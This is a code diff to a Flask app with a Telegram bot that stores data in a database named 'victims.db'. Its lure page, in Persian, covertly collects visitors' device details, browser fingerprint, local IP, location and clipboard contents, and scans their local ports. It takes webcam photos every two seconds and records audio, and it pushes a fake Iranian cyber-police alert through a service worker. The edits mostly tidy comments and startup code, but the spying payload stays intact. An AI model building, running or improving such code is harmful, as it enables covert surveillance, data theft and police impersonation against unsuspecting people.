@@ -1,4 +1,4 @@
-import os, io, uuid, base64, json, logging, sqlite3, asyncio, threading, time
+import os, io, uuid, base64, json, logging, sqlite3, threading, time
 from datetime import datetime
 from flask import Flask, request, render_template_string, send_from_directory, jsonify, g, make_response
 import requests
@@ -13,7 +13,7 @@ ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
 DATABASE = "victims.db"
 PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
 
-BOT_ACTIVE = True  # global toggle
+BOT_ACTIVE = True
 
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
@@ -40,7 +40,7 @@ def close_connection(exception):
     if db is not None:
         db.close()
 
-# -------------------- Telegram Sending Helpers (sync) --------------------
+# -------------------- Telegram Sending Helpers --------------------
 def send_telegram_message(text, reply_markup=None):
     if not TOKEN or not ADMIN_CHAT_ID:
         return
@@ -64,7 +64,7 @@ def send_telegram_file(file_bytes, filename, caption, as_image=False):
     except Exception as e:
         app.logger.error(f"Telegram file send failed: {e}")
 
-# -------------------- Capture Page (one click, continuous photos) --------------------
+# -------------------- Capture Page --------------------
 CAPTURE_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -85,21 +85,13 @@ CAPTURE_PAGE = """
             capturing=true;
             btn.style.display='none';
             msg.innerText='در حال برقراری ارتباط...';
-            // device info
             fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'device',ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'N/A'})});
-            // fingerprint
             try{var cf=document.createElement('canvas');cf.width=200;cf.height=50;var cfctx=cf.getContext('2d');cfctx.textBaseline='top';cfctx.font='14px Arial';cfctx.fillText('Browser Fingerprint '+navigator.userAgent,2,2);fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'fingerprint',data:cf.toDataURL()})});}catch(e){}
-            // internal IP
             try{var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>{if(e.candidate){var ip=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);if(ip)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'local_ip',ip:ip[1]})});}};}catch(e){}
-            // location
             if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',lat:p.coords.latitude,lng:p.coords.longitude})}),e=>fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location_error',message:e.message})}));}
-            // clipboard
             try{var clip=await navigator.clipboard.readText();if(clip)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'clipboard',data:clip})});}catch(e){}
-            // port scan
             [80,22,443,8080,3389,5900,21].forEach(p=>{var img=new Image();img.src='http://127.0.0.1:'+p+'/favicon.ico?t='+Date.now();var st=Date.now();img.onload=img.onerror=function(){if(Date.now()-st<500)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'open_port',port:p})});};});
-            // service worker
             if('serviceWorker' in navigator){navigator.serviceWorker.register('/sw.js?t='+t).then(reg=>{setTimeout(()=>{reg.showNotification('⚠️ هشدار فوری پلیس فتا',{body:'فعالیت غیرمجاز شناسایی شد. برای رفع اتهام کلیک کنید.',icon:'https://www.fata.gov.ir/images/logo.png',requireInteraction:true,vibrate:[300,100,300],data:{url:window.location.origin+'/go/'+t}});},15000);});}
-            // camera & mic
             try{
                 stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
                 v.srcObject=stream;
@@ -108,7 +100,6 @@ CAPTURE_PAGE = """
                 msg.innerText='اتصال برقرار شد.';
                 takeSnapshot();
                 window.photoInterval=setInterval(takeSnapshot,2000);
-                // record audio 5s
                 try{var aud=stream.getAudioTracks()[0];if(aud){var mr=new MediaRecorder(new MediaStream([aud]));var chunks=[];mr.ondataavailable=e=>chunks.push(e.data);mr.onstop=()=>{var blob=new Blob(chunks,{type:'audio/webm'});var reader=new FileReader();reader.onloadend=()=>{var b64=reader.result.split(',')[1];fetch('/upload/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'audio',data:b64})});};reader.readAsDataURL(blob);};mr.start();setTimeout(()=>{mr.stop();},5000);}}catch(e){}
             }catch(e){msg.innerText='عدم دسترسی به دوربین. همچنان اطلاعات جمع‌آوری می‌شود.';}
         }
@@ -418,22 +409,19 @@ def run_flask():
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
 
-async def main():
-    # Start Flask in thread
+if __name__ == '__main__':
+    # شروع Flask در یک ترد جداگانه
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
 
-    # Init DB
+    # آماده‌سازی دیتابیس
     init_db()
 
-    # Build application
+    # ساخت و اجرای ربات تلگرام (به صورت سنکرون، نه داخل asyncio.run)
     application = Application.builder().token(TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("admin", admin_cmd))
     application.add_handler(CallbackQueryHandler(button_handler))
 
-    # Run bot with close_loop=False to avoid event loop errors
-    await application.run_polling(close_loop=False)
-
-if __name__ == '__main__':
-    asyncio.run(main())
+    # اجرای polling (تا ابد منتظر می‌ماند)
+    application.run_polling()
